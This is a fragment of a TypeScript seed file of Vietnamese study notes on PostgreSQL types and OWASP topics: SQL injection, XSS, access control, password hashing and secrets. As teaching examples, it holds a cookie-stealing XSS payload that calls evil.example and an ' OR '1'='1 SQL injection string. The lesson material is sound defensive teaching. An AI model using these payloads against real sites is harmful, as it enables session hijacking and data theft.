
- \`text\` thay cho \`varchar(n)\` trừ khi nghiệp vụ thật sự cần giới hạn độ dài ở tầng database.
- \`numeric\` cho mọi giá trị tiền tệ, không bao giờ dùng \`float\`/\`double\`.
- \`timestamptz\` cho thời gian, \`jsonb\` cho dữ liệu nửa cấu trúc cần truy vấn được.`,
    tags: ['postgresql', 'kieu-du-lieu'],
    starred: false,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-sql-injection',
    topicId: 'topic-owasp',
    title: 'SQL Injection',
    slug: 'sql-injection',
    summary: 'Vì sao nối chuỗi vào câu SQL là lỗ hổng, và prepared statement chặn nó thế nào.',
    content: `Trang tìm kiếm nhận input người dùng rồi nối thẳng vào câu SQL. Người dùng gõ \`' OR '1'='1\` vào ô tên thay vì một cái tên bình thường, và toàn bộ bảng \`users\` hiện ra thay vì chỉ đúng người họ gõ.

## Vì sao nối chuỗi là lỗ hổng

\`\`\`ts
// NGUY HIỂM: nối chuỗi input trực tiếp vào câu lệnh
const name = "' OR '1'='1"
const query = \`SELECT * FROM users WHERE name = '\${name}'\`
// Câu lệnh thực tế gửi tới database:
// SELECT * FROM users WHERE name = '' OR '1'='1'  -> đúng với MỌI hàng
\`\`\`

Database không phân biệt được đâu là cú pháp câu lệnh, đâu là dữ liệu người dùng gõ — vì cả hai đã bị trộn chung vào một chuỗi.

## Prepared statement: tách dữ liệu khỏi câu lệnh

\`\`\`ts
import { Pool } from 'pg'

const pool = new Pool()
const name = "' OR '1'='1"
const result = await pool.query('SELECT * FROM users WHERE name = $1', [name])
// $1 luôn được database hiểu là DỮ LIỆU, không thể biến thành cú pháp SQL
\`\`\`

Câu lệnh (\`'SELECT * FROM users WHERE name = $1'\`) và dữ liệu (\`[name]\`) được gửi tách rời tới database; driver không bao giờ ghép chúng thành một chuỗi trước khi gửi.

## Ghi nhớ

- Không bao giờ nối chuỗi input người dùng trực tiếp vào câu SQL.
- Prepared statement (\`$1\`, \`$2\`...) gửi câu lệnh và dữ liệu tách rời, dữ liệu không thể đổi cấu trúc câu lệnh.
- ORM hiện đại dùng prepared statement bên dưới, nhưng raw query string tự nối tay vẫn nguy hiểm dù project có dùng ORM.`,
    tags: ['owasp', 'sql-injection'],
    starred: true,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-xss-cross-site-scripting',
    topicId: 'topic-owasp',
    title: 'XSS — Cross-Site Scripting',
    slug: 'xss-cross-site-scripting',
    summary: 'Ba dạng XSS và nguyên tắc escape theo ngữ cảnh xuất dữ liệu.',
    content: `Ô bình luận trên một trang cho phép nhập text tự do. Một người dùng gõ \`<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>\` thay vì bình luận bình thường, và từ đó, mọi người mở lại trang đều tự động chạy đoạn script đánh cắp cookie của chính họ.

## Ba dạng XSS

- **Stored**: script được lưu trong database (như ví dụ trên), chạy với mọi người xem lại trang sau này.
- **Reflected**: script nằm ngay trong URL, chỉ chạy khi nạn nhân bấm vào đúng link độc hại đó.
- **DOM-based**: không qua server — JavaScript phía client tự ghép dữ liệu không an toàn (như \`location.hash\`) thẳng vào DOM.

## Nguyên tắc: escape theo ngữ cảnh xuất dữ liệu

\`\`\`tsx
// An toàn: React tự escape khi render text thường
function Comment({ text }: { text: string }) {
  return <p>{text}</p> // "<script>" hiển thị như chữ, trình duyệt không chạy nó
}

// Nguy hiểm: bỏ qua cơ chế escape của framework
function CommentRaw({ html }: { html: string }) {
  return <p dangerouslySetInnerHTML={{ __html: html }} /> // script bên trong sẽ thực sự chạy
}
\`\`\`

## Ghi nhớ

- Escape đúng ngữ cảnh: text trong HTML, thuộc tính HTML, URL và JavaScript mỗi loại cần cách escape riêng.
- Framework hiện đại (React, Vue) tự escape khi render text bình thường; chỉ mất an toàn khi chủ động dùng API "raw HTML".
- Bắt buộc render HTML do người dùng nhập thì phải lọc qua thư viện sanitize (như DOMPurify), không tự viết regex để lọc thẻ.`,
    tags: ['owasp', 'xss'],
    starred: false,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-loi-kiem-soat-truy-cap',
    topicId: 'topic-owasp',
    title: 'Lỗi kiểm soát truy cập',
    slug: 'loi-kiem-soat-truy-cap',
    summary: 'Kiểm tra quyền ở server cho từng bản ghi, không tin vào việc ẩn nút trên giao diện.',
    content: `Giao diện chỉ hiện nút "Xoá" cho admin, người dùng thường không thấy nút đó nên coi như đã "khoá" tính năng. Nhưng ai đó mở DevTools, sao chép request, rồi gọi thẳng \`DELETE /api/notes/123\` bằng \`curl\` — và ghi chú của người khác bị xoá, vì phía server không hề kiểm tra lại quyền.

## Kiểm tra quyền phải nằm ở server

\`\`\`ts
export async function DELETE(req: Request, { params }: { params: { id: string } }) {
  const session = await getSession(req)
  if (!session) return new Response('Unauthorized', { status: 401 })

  const note = await notesRepo.findById(params.id)
  if (!note || note.ownerId !== session.userId) {
    return new Response('Forbidden', { status: 403 })
  }

  await notesRepo.remove(params.id)
  return new Response(null, { status: 204 })
}
\`\`\`

Ẩn nút trên giao diện chỉ ngăn người dùng bình thường bấm nhầm; nó không ngăn ai đó gọi thẳng API.

## Kiểm tra theo từng bản ghi, không chỉ theo vai trò

Nhiều hệ thống chỉ kiểm tra "đã đăng nhập" hoặc \`role === 'admin'\` rồi coi như đủ. Nhưng một user thường vẫn cần sửa được ghi chú *của chính họ* — route đó phải so khớp \`note.ownerId\` với người đang đăng nhập cho từng request, không phải chỉ kiểm tra một lần ở tầng vai trò chung.

## Ghi nhớ

- Ẩn nút trên giao diện là UX, không phải bảo mật — mọi endpoint phải tự kiểm tra quyền phía server.
- Kiểm tra theo từng bản ghi (record-level), không chỉ theo vai trò chung chung.
- Mặc định từ chối: chỉ cho phép sau khi đã xác nhận đúng chủ sở hữu hoặc quyền cụ thể.`,
    tags: ['owasp', 'phan-quyen'],
    starred: false,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-luu-mat-khau-dung-cach',
    topicId: 'topic-owasp',
    title: 'Lưu mật khẩu đúng cách',
    slug: 'luu-mat-khau-dung-cach',
    summary: 'Vì sao phải hash chậm có salt, và vì sao đừng tự nghĩ ra thuật toán.',
    content: `Database bị rò rỉ. Vì mật khẩu được lưu bằng MD5 không salt, kẻ tấn công tra ngược qua rainbow table có sẵn trên mạng và có lại mật khẩu gốc của hàng loạt tài khoản chỉ trong vài giây — MD5 vốn được thiết kế để chạy cực nhanh, đúng thứ không nên có khi hash mật khẩu.

## Hash chậm có salt, không phải hash nhanh

\`\`\`ts
import bcrypt from 'bcrypt'

const matKhau = 'hunter2'
const hash = await bcrypt.hash(matKhau, 12) // 12: cost factor, càng cao càng chậm và càng khó brute-force
const isValid = await bcrypt.compare(matKhau, hash) // true
const isSaiMatKhau = await bcrypt.compare('sai-mat-khau', hash) // false
\`\`\`

\`bcrypt\` tự sinh salt ngẫu nhiên cho từng lần hash và cố tình chạy chậm — GPU không thể thử hàng tỷ khả năng mỗi giây như với MD5/SHA1 trần.

## Đừng tự nghĩ ra thuật toán

Tự chế cách "làm rối" mật khẩu (đảo chuỗi, XOR, hash tay nhiều lớp...) hầu như luôn yếu hơn thuật toán đã được cộng đồng bảo mật kiểm chứng qua nhiều năm, vì thiếu kinh nghiệm đối phó với các kiểu tấn công đã biết.

## Ghi nhớ

- Không bao giờ lưu mật khẩu dạng plain text hay hash nhanh trần (MD5, SHA1, SHA256 không salt).
- Dùng \`bcrypt\` hoặc \`argon2\` — hash chậm, tự sinh salt ngẫu nhiên riêng cho từng mật khẩu.
- Cost factor cao hơn thì an toàn hơn nhưng chậm hơn — chọn mức vẫn chấp nhận được cho thời gian đăng nhập.`,
    tags: ['owasp', 'mat-khau', 'hashing'],
    starred: false,
    createdAt: NOW,
    updatedAt: NOW,
  },
  {
    id: 'note-quan-ly-secret-va-bien-moi-truong',
    topicId: 'topic-owasp',
    title: 'Quản lý secret và biến môi trường',
    slug: 'quan-ly-secret-va-bien-moi-truong',
    summary: 'Không commit secret, phân biệt biến chỉ ở server với biến lộ ra client.',
    content: `Khoá API của dịch vụ thanh toán bị commit thẳng vào code, đẩy lên một repository công khai trên GitHub. Chỉ vài phút sau, bot tự động quét repository công khai đã tìm ra khoá đó và bắt đầu dùng thử.

## Không commit secret vào git

\`\`\`bash
# .env (không commit — thêm vào .gitignore)
DATABASE_URL=postgres://user:pass@localhost:5432/db
STRIPE_SECRET_KEY=sk_live_xxx
\`\`\`

\`\`\`bash
# .gitignore
.env
.env.local
\`\`\`

Secret nên nằm trong biến môi trường (hoặc secret manager của nền tảng deploy), không bao giờ nằm trong file được commit.

## Server-only và biến lộ ra client

\`\`\`ts
// Chỉ đọc được ở server: route handler, Server Component, Server Action
const secretKey = process.env.STRIPE_SECRET_KEY

// Biến NEXT_PUBLIC_* được đóng gói thẳng vào bundle JS gửi cho trình duyệt
const publicKey = process.env.NEXT_PUBLIC_STRIPE_KEY
\`\`\`

Ở Next.js, bất kỳ biến nào đặt tên bắt đầu bằng \`NEXT_PUBLIC_\` đều bị nhúng vào mã nguồn phía client — ai mở DevTools cũng đọc được, nên tuyệt đối không đặt secret thật dưới tên đó.

## Ghi nhớ

- Secret không bao giờ nằm trong code hay bị commit vào git — dùng biến môi trường hoặc secret manager.
- Ở Next.js, chỉ biến bắt đầu bằng \`NEXT_PUBLIC_\` mới lộ ra trình duyệt; secret thật phải đặt tên khác.
- Nếu secret lỡ bị commit, phải xoay vòng (rotate) khoá mới ngay — xoá khỏi lịch sử git không đủ, khoá cũ coi như đã lộ vĩnh viễn.`,
    tags: ['owasp', 'secret'],
    starred: false,
    createdAt: NOW,
    updatedAt: NOW,
  },
]
